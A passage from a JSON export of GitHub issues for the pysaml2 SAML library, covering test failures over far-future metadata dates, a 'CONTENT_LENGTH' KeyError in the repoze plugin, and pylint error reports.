https://www.zimride.com/shibboleth\r\n[  200s] \r\n[  200s] ../../BUILDROOT/python-pysaml2-5.0.0-38.1.i386/usr/lib/python3.8/site-packages/saml2/mdstore.py:1090: UnknownSystemEntity\r\n[  200s] ------------------------------ Captured log call -------------------------------\r\n[  200s] ERROR    saml2.mdstore:mdstore.py:571 Invalid XML message: Class 'EntitiesDescriptor' instance: Wrong type of value '2999-11-28T09:10:09Z' on attribute 'valid_until' expected it to be dateTime\r\n[  200s] ERROR    saml2.mdstore:mdstore.py:571 Invalid XML message: Class 'EntitiesDescriptor' instance: Wrong type of value '2999-02-18T10:00:00Z' on attribute 'valid_until' expected it to be dateTime\r\n[  200s] ERROR    saml2.mdstore:mdstore.py:1089 Unknown system entity: https://www.zimride.com/shibboleth\r\n[  200s] ________________________________ test_swamid_sp ________________________________\r\n[  200s] \r\n[  200s]     def test_swamid_sp():\r\n[  200s]         mds = MetadataStore(ATTRCONV, sec_config,\r\n[  200s]                             disable_ssl_certificate_validation=True,\r\n[  200s]                             filter=AllowDescriptor([\"spsso\"]))\r\n[  200s]     \r\n[  200s]         mds.imp(METADATACONF[\"1\"])\r\n[  200s]         sps = mds.with_descriptor(\"spsso\")\r\n[  200s] >       assert len(sps) == 417\r\n[  200s] E       assert 0 == 417\r\n[  200s] E         -0\r\n[  200s] E         +417\r\n[  200s] \r\n[  200s] tests/test_38_metadata_filter.py:30: AssertionError\r\n[  200s] ------------------------------ Captured log call -------------------------------\r\n[  200s] ERROR    saml2.mdstore:mdstore.py:571 Invalid XML message: Class 'EntitiesDescriptor' instance: Wrong type of value '2999-12-13T10:05:05Z' on attribute 'valid_until' expected it to be dateTime\r\n[  200s] _______________________________ test_swamid_idp ________________________________\r\n[  200s] \r\n[  200s]     def test_swamid_idp():\r\n[  200s]         mds = MetadataStore(ATTRCONV, sec_config,\r\n[  200s]                             disable_ssl_certificate_validation=True,\r\n[  200s]                             filter=AllowDescriptor([\"idpsso\"]))\r\n[  200s]     \r\n[  200s]         mds.imp(METADATACONF[\"1\"])\r\n[  200s]         sps = mds.with_descriptor(\"spsso\")\r\n[  200s]         assert len(sps) == 0\r\n[  200s]         idps = mds.with_descriptor(\"idpsso\")\r\n[  200s] >       assert len(idps) == 275\r\n[  200s] E       assert 0 == 275\r\n[  200s] E         -0\r\n[  200s] E         +275\r\n[  200s] \r\n[  200s] tests/test_38_metadata_filter.py:43: AssertionError\r\n[  200s] ------------------------------ Captured log call -------------------------------\r\n[  200s] ERROR    saml2.mdstore:mdstore.py:571 Invalid XML message: Class 'EntitiesDescriptor' instance: Wrong type of value '2999-12-13T10:05:05Z' on attribute 'valid_until' expected it to be dateTime\r\n[  200s] _______________________ TestResponse.test_other_response _______________________\r\n[  200s] \r\n[  200s] self = <test_41_response.TestResponse object at 0xb367ccd0>\r\n[  200s] \r\n[  200s]     def test_other_response(self):\r\n[  200s]         with open(full_path(\"attribute_response.xml\")) as fp:\r\n[  200s]             xml_response = fp.read()\r\n[  200s] >       resp = response_factory(\r\n[  200s]             xml_response, self.conf,\r\n[  200s]             return_addrs=['https://myreviewroom.com/saml2/acs/'],\r\n[  200s]             outstanding_queries={'id-f4d370f3d03650f3ec0da694e2348bfe':\r\n[  200s]                                  \"http://localhost:8088/sso\"},\r\n[  200s]             timeslack=TIMESLACK, decode=False)\r\n[  200s] \r\n[  200s] tests/test_41_response.py:125: \r\n[  200s] _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ \r\n[  200s] \r\n[  200s] xmlstr = '<saml2p:Response xmlns:saml2p=\"urn:oasis:names:tc:SAML:2.0:protocol\"\\n                 Destination=\"https://myreviewr...ue>\\n            </saml2:Attribute>\\n        </saml2:AttributeStatement>\\n    </saml2:Assertion>\\n</saml2p:Response>\\n'\r\n[  200s] conf = <saml2.config.SPConfig object at 0xb3499b08>\r\n[  200s] return_addrs = ['https://myreviewroom.com/saml2/acs/']\r\n[  200s] outstanding_queries = {'id-f4d370f3d03650f3ec0da694e2348bfe': 'http://localhost:8088/sso'}\r\n[  200s] timeslack = 300, decode = False, request_id = 0, origxml = None, asynchop = True\r\n[  200s] allow_unsolicited = False, want_assertions_signed = False, conv_info = None\r\n[  200s] \r\n[  200s]     def response_factory(xmlstr, conf, return_addrs=None, outstanding_queries=None,\r\n[  200s]             timeslack=0, decode=True, request_id=0, origxml=None,\r\n[  200s]             asynchop=True, allow_unsolicited=False,\r\n[  200s]             want_assertions_signed=False, conv_info=None):\r\n[  200s]         sec_context = security_context(conf)\r\n[  200s]         if not timeslack:\r\n[  200s]             try:\r\n[  200s]                 timeslack = int(conf.accepted_time_diff)\r\n[  200s]             except TypeError:\r\n[  200s]                 timeslack = 0\r\n[  200s]     \r\n[  200s]         attribute_converters = conf.attribute_converters\r\n[  200s]         entity_id = conf.entityid\r\n[  200s]         extension_schema = conf.extension_schema\r\n[  200s]     \r\n[  200s]         response = StatusResponse(sec_context, return_addrs, timeslack, request_id,\r\n[  200s]                                   asynchop, conv_info=conv_info)\r\n[  200s]         try:\r\n[  200s]             response.loads(xmlstr, decode, origxml)\r\n[  200s] >           if response.response.assertion or response.response.encrypted_assertion:\r\n[  200s] E           AttributeError: 'NoneType' object has no attribute 'assertion'\r\n[  200s] \r\n[  200s] ../../BUILDROOT/python-pysaml2-5.0.0-38.1.i386/usr/lib/python3.8/site-packages/saml2/response.py:1262: AttributeError\r\n[  200s] ------------------------------ Captured log call -------------------------------\r\n[  200s] ERROR    saml2.response:response.py:298 Not valid response: Class 'Response' instance: Class 'Assertion' instance: Class 'Subject' instance: Class 'SubjectConfirmation' instance: Class 'SubjectConfirmationData' instance: Wrong type of value '2999-09-14T21:06:32.081Z' on attribute 'not_on_or_after' expected it to be dateTime\r\n[  200s] ___________________________ TestVirtualOrg.test_mta ____________________________\r\n[  200s] \r\n[  200s] self = <test_62_vo.TestVirtualOrg object at 0xb3bdefe8>\r\n[  200s] \r\n[  200s]     def test_mta(self):\r\n[  200s] >       aas = self.vo.members_to_ask(nid)\r\n[  200s] \r\n[  200s] tests/test_62_vo.py:41: \r\n[  200s] _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ \r\n[  200s] ../../BUILDROOT/python-pysaml2-5.0.0-38.1.i386/usr/lib/python3.8/site-packages/saml2/virtual_org.py:37: in members_to_ask\r\n[  200s]     vo_members = self._affiliation_members()\r\n[  200s] ../../BUILDROOT/python-pysaml2-5.0.0-38.1.i386/usr/lib/python3.8/site-packages/saml2/virtual_org.py:30: in _affiliation_members\r\n[  200s]     return self.sp.config.metadata.vo_members(self._name)\r\n[  200s] ../../BUILDROOT/python-pysaml2-5.0.0-38.1.i386/usr/lib/python3.8/site-packages/saml2/mdstore.py:1263: in vo_members\r\n[  200s]     ad = self.__getitem__(entity_id)[\"affiliation_descriptor\"]\r\n[  200s] _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ \r\n[  200s] \r\n[  200s] self = <saml2.mdstore.MetadataStore object at 0xb38952e0>\r\n[  200s] item = 'urn:mace:example.com:it:tek'\r\n[  200s] \r\n[  200s]     def __getitem__(self, item):\r\n[  200s]         for _md in self.metadata.values():\r\n[  200s]             try:\r\n[  200s]                 return _md[item]\r\n[  200s]             except KeyError:\r\n[  200s]                 pass\r\n[  200s]     \r\n[  200s] >       raise KeyError(item)\r\n[  200s] E       KeyError: 'urn:mace:example.com:it:tek'\r\n[  200s] \r\n[  200s] ../../BUILDROOT/python-pysaml2-5.0.0-38.1.i386/usr/lib/python3.8/site-packages/saml2/mdstore.py:1235: KeyError\r\n[  200s] ------------------------------ Captured log setup ------------------------------\r\n[  200s] ERROR    saml2.mdstore:mdstore.py:571 Invalid XML message: Class 'EntitiesDescriptor' instance: Wrong type of value '2999-11-28T09:10:09Z' on attribute 'valid_until' expected it to be dateTime\r\n[  200s] _____________________ TestVirtualOrg.test_unknown_subject ______________________\r\n[  200s] \r\n[  200s] self = <test_62_vo.TestVirtualOrg object at 0xb4502cb8>\r\n[  200s] \r\n[  200s]     def test_unknown_subject(self):\r\n[  200s] >       aas = self.vo.members_to_ask(nid0)\r\n[  200s] \r\n[  200s] tests/test_62_vo.py:47: \r\n[  200s] _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ \r\n[  200s] ../../BUILDROOT/python-pysaml2-5.0.0-38.1.i386/usr/lib/python3.8/site-packages/saml2/virtual_org.py:37: in members_to_ask\r\n[  200s]     vo_members = self._affiliation_members()\r\n[  200s] ../../BUILDROOT/python-pysaml2-5.0.0-38.1.i386/usr/lib/python3.8/site-packages/saml2/virtual_org.py:30: in _affiliation_members\r\n[  200s]     return self.sp.config.metadata.vo_members(self._name)\r\n[  200s] ../../BUILDROOT/python-pysaml2-5.0.0-38.1.i386/usr/lib/python3.8/site-packages/saml2/mdstore.py:1263: in vo_members\r\n[  200s]     ad = self.__getitem__(entity_id)[\"affiliation_descriptor\"]\r\n[  200s] _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ \r\n[  200s] \r\n[  200s] self = <saml2.mdstore.MetadataStore object at 0xb38952e0>\r\n[  200s] item = 'urn:mace:example.com:it:tek'\r\n[  200s] \r\n[  200s]     def __getitem__(self, item):\r\n[  200s]         for _md in self.metadata.values():\r\n[  200s]             try:\r\n[  200s]                 return _md[item]\r\n[  200s]             except KeyError:\r\n[  200s]                 pass\r\n[  200s]     \r\n[  200s] >       raise KeyError(item)\r\n[  200s] E       KeyError: 'urn:mace:example.com:it:tek'\r\n[  200s] \r\n[  200s] ../../BUILDROOT/python-pysaml2-5.0.0-38.1.i386/usr/lib/python3.8/site-packages/saml2/mdstore.py:1235: KeyError\r\n[  200s] __________________________ TestVirtualOrg_2.test_mta ___________________________\r\n[  200s] \r\n[  200s] self = <test_62_vo.TestVirtualOrg_2 object at 0xb3895e50>\r\n[  200s] \r\n[  200s]     def test_mta(self):\r\n[  200s] >       aas = self.sp.vorg.members_to_ask(nid)\r\n[  200s] \r\n[  200s] tests/test_62_vo.py:70: \r\n[  200s] _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ \r\n[  200s] ../../BUILDROOT/python-pysaml2-5.0.0-38.1.i386/usr/lib/python3.8/site-packages/saml2/virtual_org.py:37: in members_to_ask\r\n[  200s]     vo_members = self._affiliation_members()\r\n[  200s] ../../BUILDROOT/python-pysaml2-5.0.0-38.1.i386/usr/lib/python3.8/site-packages/saml2/virtual_org.py:30: in _affiliation_members\r\n[  200s]     return self.sp.config.metadata.vo_members(self._name)\r\n[  200s] ../../BUILDROOT/python-pysaml2-5.0.0-38.1.i386/usr/lib/python3.8/site-packages/saml2/mdstore.py:1263: in vo_members\r\n[  200s]     ad = self.__getitem__(entity_id)[\"affiliation_descriptor\"]\r\n[  200s] _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ \r\n[  200s] \r\n[  200s] self = <saml2.mdstore.MetadataStore object at 0xb3895a90>\r\n[  200s] item = 'urn:mace:example.com:it:tek'\r\n[  200s] \r\n[  200s]     def __getitem__(self, item):\r\n[  200s]         for _md in self.metadata.values():\r\n[  200s]             try:\r\n[  200s]                 return _md[item]\r\n[  200s]             except KeyError:\r\n[  200s]                 pass\r\n[  200s]     \r\n[  200s] >       raise KeyError(item)\r\n[  200s] E       KeyError: 'urn:mace:example.com:it:tek'\r\n[  200s] \r\n[  200s] ../../BUILDROOT/python-pysaml2-5.0.0-38.1.i386/usr/lib/python3.8/site-packages/saml2/mdstore.py:1235: KeyError\r\n[  200s] ------------------------------ Captured log setup ------------------------------\r\n[  200s] ERROR    saml2.mdstore:mdstore.py:571 Invalid XML message: Class 'EntitiesDescriptor' instance: Wrong type of value '2999-11-28T09:10:09Z' on attribute 'valid_until' expected it to be dateTime\r\n[  200s] ____________________ TestVirtualOrg_2.test_unknown_subject _____________________\r\n[  200s] \r\n[  200s] self = <test_62_vo.TestVirtualOrg_2 object at 0xb33f1e50>\r\n[  200s] \r\n[  200s]     def test_unknown_subject(self):\r\n[  200s] >       aas = self.sp.vorg.members_to_ask(nid0)\r\n[  200s] \r\n[  200s] tests/test_62_vo.py:76: \r\n[  200s] _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ \r\n[  200s] ../../BUILDROOT/python-pysaml2-5.0.0-38.1.i386/usr/lib/python3.8/site-packages/saml2/virtual_org.py:37: in members_to_ask\r\n[  200s]     vo_members = self._affiliation_members()\r\n[  200s] ../../BUILDROOT/python-pysaml2-5.0.0-38.1.i386/usr/lib/python3.8/site-packages/saml2/virtual_org.py:30: in _affiliation_members\r\n[  200s]     return self.sp.config.metadata.vo_members(self._name)\r\n[  200s] ../../BUILDROOT/python-pysaml2-5.0.0-38.1.i386/usr/lib/python3.8/site-packages/saml2/mdstore.py:1263: in vo_members\r\n[  200s]     ad = self.__getitem__(entity_id)[\"affiliation_descriptor\"]\r\n[  200s] _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ \r\n[  200s] \r\n[  200s] self = <saml2.mdstore.MetadataStore object at 0xb3895a90>\r\n[  200s] item = 'urn:mace:example.com:it:tek'\r\n[  200s] \r\n[  200s]     def __getitem__(self, item):\r\n[  200s]         for _md in self.metadata.values():\r\n[  200s]             try:\r\n[  200s]                 return _md[item]\r\n[  200s]             except KeyError:\r\n[  200s]                 pass\r\n[  200s]     \r\n[  200s] >       raise KeyError(item)\r\n[  200s] E       KeyError: 'urn:mace:example.com:it:tek'\r\n[  200s] \r\n[  200s] ../../BUILDROOT/python-pysaml2-5.0.0-38.1.i386/usr/lib/python3.8/site-packages/saml2/mdstore.py:1235: KeyError\r\n[  200s] =============================== warnings summary ===============================\r\n[  200s] tests/test_20_assertion.py:154\r\n[  200s]   /home/abuild/rpmbuild/BUILD/pysaml2-5.0.0/tests/test_20_assertion.py:154: DeprecationWarning: invalid escape sequence \\.\r\n[  200s]     \"mail\": [\".*@.*\\.umu\\.se\"],\r\n[  200s] \r\n[  200s] tests/test_20_assertion.py:176\r\n[  200s]   /home/abuild/rpmbuild/BUILD/pysaml2-5.0.0/tests/test_20_assertion.py:176: DeprecationWarning: invalid escape sequence \\.\r\n[  200s]     \"mail\": [\".*@.*\\.umu\\.se\"],\r\n[  200s] \r\n[  200s] tests/test_20_assertion.py:198\r\n[  200s]   /home/abuild/rpmbuild/BUILD/pysaml2-5.0.0/tests/test_20_assertion.py:198: DeprecationWarning: invalid escape sequence \\.\r\n[  200s]     \"mail\": [\".*@.*\\.umu\\.se\"],\r\n[  200s] \r\n[  200s] tests/test_20_assertion.py:228\r\n[  200s]   /home/abuild/rpmbuild/BUILD/pysaml2-5.0.0/tests/test_20_assertion.py:228: DeprecationWarning: invalid escape sequence \\.\r\n[  200s]     \"mail\": [\".*@.*\\.umu\\.se\"],\r\n[  200s] \r\n[  200s] tests/test_20_assertion.py:264\r\n[  200s]   /home/abuild/rpmbuild/BUILD/pysaml2-5.0.0/tests/test_20_assertion.py:264: DeprecationWarning: invalid escape sequence \\.\r\n[  200s]     \"mail\": [\".*@.*\\.umu\\.se\"],\r\n[  200s] \r\n[  200s] tests/test_20_assertion.py:691\r\n[  200s]   /home/abuild/rpmbuild/BUILD/pysaml2-5.0.0/tests/test_20_assertion.py:691: DeprecationWarning: invalid escape sequence \\.\r\n[  200s]     \"mail\": [\".*@example\\.com$\"],\r\n[  200s] \r\n[  200s] tests/test_20_assertion.py:715\r\n[  200s]   /home/abuild/rpmbuild/BUILD/pysaml2-5.0.0/tests/test_20_assertion.py:715: DeprecationWarning: invalid escape sequence \\.\r\n[  200s]     \"mail\": [\".*@example\\.com$\"],\r\n[  200s] \r\n[  200s] tests/test_60_sp.py::TestSP::test_identify\r\n[  200s]   /home/abuild/rpmbuild/BUILD/pysaml2-5.0.0/tests/test_60_sp.py:76: DeprecationWarning: encodestring() is a deprecated alias since 3.1, use encodebytes()\r\n[  200s]     resp_str = base64.encodestring(resp_str.encode('utf-8'))\r\n[  200s] \r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_defaults\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_defaults\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_defaults\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_defaults\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_defaults\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_128_cbc\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_128_cbc\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_128_cbc\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_128_cbc\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_128_cbc\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_128_cfb\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_128_cfb\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_128_cfb\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_128_cfb\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_128_cfb\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_192_cbc\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_192_cbc\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_192_cbc\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_192_cbc\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_192_cbc\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_192_cfb\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_192_cfb\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_192_cfb\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_192_cfb\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_192_cfb\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_256_cbc\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_256_cbc\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_256_cbc\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_256_cbc\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_256_cbc\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_256_cfb\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_256_cfb\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_256_cfb\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_256_cfb\r\n[  200s] tests/test_92_aes.py::TestAES::test_aes_256_cfb\r\n[  200s]   /home/abuild/rpmbuild/BUILDROOT/python-pysaml2-5.0.0-38.1.i386/usr/lib/python3.8/site-packages/saml2/cryptography/symmetric.py:119: DeprecationWarning: AESCipher type is deprecated. It will be removed in the next version. Use saml2.cryptography.symmetric.Default or saml2.cryptography.symmetric.Fernet instead.\r\n[  200s]     _warnings.warn(_deprecation_msg, DeprecationWarning)\r\n[  200s] \r\n[  200s] -- Docs: https://docs.pytest.org/en/latest/warnings.html\r\n[  200s] ============ 8 failed, 650 passed, 43 warnings in 156.54s (0:02:36) ============\r\n```\r\n\r\n\r\n## Steps to Reproduce\r\n1. Run ``py.test-3.8 --ignore=_build.python2 --ignore=_build.python3 --ignore=_build.pypy3 -v tests``\r\n2.\r\n3.\r\n4.\r\n\r\nComplete [log](https://github.com/IdentityPython/pysaml2/files/4582790/_log.txt) with all details shows all versions of packages used and steps taken.\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/676", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/676/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/676/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/676/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/676", "id": 604325837, "node_id": "MDU6SXNzdWU2MDQzMjU4Mzc=", "number": 676, "title": "KeyError: 'CONTENT_LENGTH' on empty request with s2repoze", "user": {"login": "adborden", "id": 509703, "node_id": "MDQ6VXNlcjUwOTcwMw==", "avatar_url": "https://avatars2.githubusercontent.com/u/509703?v=4", "gravatar_id": "", "url": "https://api.github.com/users/adborden", "html_url": "https://github.com/adborden", "followers_url": "https://api.github.com/users/adborden/followers", "following_url": "https://api.github.com/users/adborden/following{/other_user}", "gists_url": "https://api.github.com/users/adborden/gists{/gist_id}", "starred_url": "https://api.github.com/users/adborden/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/adborden/subscriptions", "organizations_url": "https://api.github.com/users/adborden/orgs", "repos_url": "https://api.github.com/users/adborden/repos", "events_url": "https://api.github.com/users/adborden/events{/privacy}", "received_events_url": "https://api.github.com/users/adborden/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-04-21T22:29:51Z", "updated_at": "2020-04-28T08:15:53Z", "closed_at": "2020-04-28T08:15:53Z", "author_association": "NONE", "active_lock_reason": null, "body": "On GET /, we're seeing the application crash with a KeyError. It looks like the boolean condition is wrong.\r\n\r\n## Code Version\r\nv4.9.0\r\nrepoze.who 2.0\r\n\r\n## Expected Behavior\r\nRequest should go through successfully without an identity.\r\n\r\n## Current Behavior\r\n```\r\nmod_wsgi (pid=26207): Exception occurred processing WSGI script '/etc/ckan/apache.wsgi'.\r\nTraceback (most recent call last):\r\n  File \"/usr/lib/ckan/lib/python2.7/site-packages/paste/cascade.py\", line 130, in __call__\r\n    return self.apps[-1](environ, start_response)\r\n  File \"/usr/lib/ckan-new/src/ckan/ckan/config/middleware.py\", line 226, in __call__\r\n    return self.app(environ, start_response)\r\n  File \"/usr/lib/ckan/lib/python2.7/site-packages/paste/registry.py\", line 379, in __call__\r\n    app_iter = self.application(environ, start_response)\r\n  File \"/usr/lib/ckan/lib/python2.7/site-packages/repoze/who/middleware.py\", line 76, in __call__\r\n    identity = api.authenticate()\r\n  File \"/usr/lib/ckan/lib/python2.7/site-packages/repoze/who/api.py\", line 129, in authenticate\r\n    ids = self._identify()\r\n  File \"/usr/lib/ckan/lib/python2.7/site-packages/repoze/who/api.py\", line 308, in _identify\r\n    identity = plugin.identify(self.environ)\r\n  File \"/usr/lib/ckan-new/src/pysaml2/src/saml2/s2repoze/plugins/sp.py\", line 478, in identify\r\n    has_content_length = \"CONTENT_LENGTH\" in environ or environ[\"CONTENT_LENGTH\"]\r\nKeyError: 'CONTENT_LENGTH'\r\n```\r\n\r\n## Possible Solution\r\nIt looks like the `or` should be flipped to an `and` to avoid the key error.\r\n\r\n## Steps to Reproduce\r\n1. Configure pysaml2 with repoze.who, who.ini:\r\n```\r\n[plugin:auth_tkt]\r\nuse = ckan.lib.auth_tkt:make_plugin\r\nsecret = ...\r\n\r\n[plugin:saml2auth]\r\nuse = saml2.s2repoze.plugins.sp:make_plugin\r\nsaml_conf = ckanext.saml2.config_max.sp_config\r\nremember_name = auth_tkt\r\nsid_store = /var/tmp/ckan/outstanding\r\nidentity_cache = memcached\r\n\r\n[plugin:saml2_challenge_decider]\r\nuse = saml2.s2repoze.plugins.challenge_decider:make_plugin\r\npath_login = /user/login\r\n\r\n[general]\r\nrequest_classifier = repoze.who.classifiers:default_request_classifier\r\nchallenge_decider = saml2_challenge_decider\r\n\r\n[identifiers]\r\nplugins =\r\n    saml2auth\r\n    auth_tkt\r\n\r\n[authenticators]\r\nplugins =\r\n    saml2auth\r\n\r\n[challengers]\r\nplugins =\r\n    saml2auth\r\n```\r\n2. Issue `curl localhost`\r\n\r\n", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/675", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/675/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/675/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/675/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/675", "id": 600516120, "node_id": "MDU6SXNzdWU2MDA1MTYxMjA=", "number": 675, "title": "pylint-3.8 -E issues lots of errors", "user": {"login": "stroeder", "id": 9304079, "node_id": "MDQ6VXNlcjkzMDQwNzk=", "avatar_url": "https://avatars2.githubusercontent.com/u/9304079?v=4", "gravatar_id": "", "url": "https://api.github.com/users/stroeder", "html_url": "https://github.com/stroeder", "followers_url": "https://api.github.com/users/stroeder/followers", "following_url": "https://api.github.com/users/stroeder/following{/other_user}", "gists_url": "https://api.github.com/users/stroeder/gists{/gist_id}", "starred_url": "https://api.github.com/users/stroeder/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/stroeder/subscriptions", "organizations_url": "https://api.github.com/users/stroeder/orgs", "repos_url": "https://api.github.com/users/stroeder/repos", "events_url": "https://api.github.com/users/stroeder/events{/privacy}", "received_events_url": "https://api.github.com/users/stroeder/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 5, "created_at": "2020-04-15T18:53:23Z", "updated_at": "2020-05-12T11:26:29Z", "closed_at": "2020-05-12T11:26:29Z", "author_association": "NONE", "active_lock_reason": null, "body": "When scanning for errors (not style!) with pylint lots of messages are printed. There might be some false positives in there caused by mix-in classes but still there are many symbols found which are not available in PY3 anymore.\r\n\r\nCheck yourself e.g. with:\r\npylint-3.8 -E src/\r\n\r\nBefore I eventually try to fix things I'd like to know what's your opinion on pylint's output.", "performed_via_github_app": null, "score": 1.0}, {"url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/673", "repository_url": "https://api.github.com/repos/IdentityPython/pysaml2", "labels_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/673/labels{/name}", "comments_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/673/comments", "events_url": "https://api.github.com/repos/IdentityPython/pysaml2/issues/673/events", "html_url": "https://github.com/IdentityPython/pysaml2/issues/673", "id": 591879159, "node_id": "MDU6SXNzdWU1OTE4NzkxNTk=", "number": 673, "title": "mdstore tests fail with ToOld expection", "user": {"login": "stas2k", "id": 50859, "node_id": "MDQ6VXNlcjUwODU5", "avatar_url": "https://avatars0.githubusercontent.com/u/50859?v=4", "gravatar_id": "", "url": "https://api.github.com/users/stas2k", "html_url": "https://github.com/stas2k", "followers_url": "https://api.github.com/users/stas2k/followers", "following_url": "https://api.github.com/users/stas2k/following{/other_user}", "gists_url": "https://api.github.com/users/stas2k/gists{/gist_id}", "starred_url": "https://api.github.com/users/stas2k/starred{/owner}{/repo}", "subscriptions_url": "https://api.github.com/users/stas2k/subscriptions", "organizations_url": "https://api.github.com/users/stas2k/orgs", "repos_url": "https://api.github.com/users/stas2k/repos", "events_url": "https://api.github.com/users/stas2k/events{/privacy}", "received_events_url": "https://api.github.com/users/stas2k/received_events", "type": "User", "site_admin": false}, "labels": [], "state": "closed", "locked": false, "assignee": null, "assignees": [], "milestone": null, "comments": 1, "created_at": "2020-04-01T12:31:02Z", "updated_at": "2020-04-01T12:36:29Z", "closed_at": "2020-04-01T12:36:29Z", "author_association": "NONE", "active_lock_reason": null, "body": "Package tests defined in `tests/test_30_mdstore.py` and `tests/test_30_mdstore_old.py` fail with `saml2.mdstore.ToOld: Metadata not valid anymore, it's only valid until 2020-02-10T09:59:21Z` error.\r\n\r\n## Code Version\r\nBuilding python3.7-pysaml2-4.8.0 package on NixOS.\r\n\r\n## Expected Behavior\r\nTest suceed\r\n\r\n## Current Behavior\r\nTests fail with the following error:\r\n```\r\n________________________________ test_switch_1 _________________________________\r\n\r\n    def test_switch_1():\r\n        mds = MetadataStore(ATTRCONV, sec_config,\r\n                            disable_ssl_certificate_validation=True)\r\n    \r\n>       mds.imp(METADATACONF[\"5\"])\r\n\r\ntests/test_30_mdstore.py:263:\r\n_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _\r\n/nix/store/6c7kh9c4z0drc2q85h4ai1hxjd2d1f6f-python3.7-pysaml2-4.8.0/lib/python3.7/site-packages/saml2/mdstore.py:1000: in imp\r\n    _md.load()\r\n/nix/store/6c7kh9c4z0drc2q85h4ai1hxjd2d1f6f-python3.7-pysaml2-4.8.0/lib/python3.7/site-packages/saml2/mdstore.py:673: in load\r\n    return self.parse_and_check_signature(_txt)\r\n/nix/store/6c7kh9c4z0drc2q85h4ai1hxjd2d1f6f-python3.7-pysaml2-4.8.0/lib/python3.7/site-packages/saml2/mdstore.py:635: in parse\r\n_and_check_signature\r\n    self.parse(txt)\r\n_ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _\r\n\r\nself = <saml2.mdstore.MetaDataFile object at 0x7ffff180a490>\r\nxmlstr = b'<?xml version=\"1.0\" 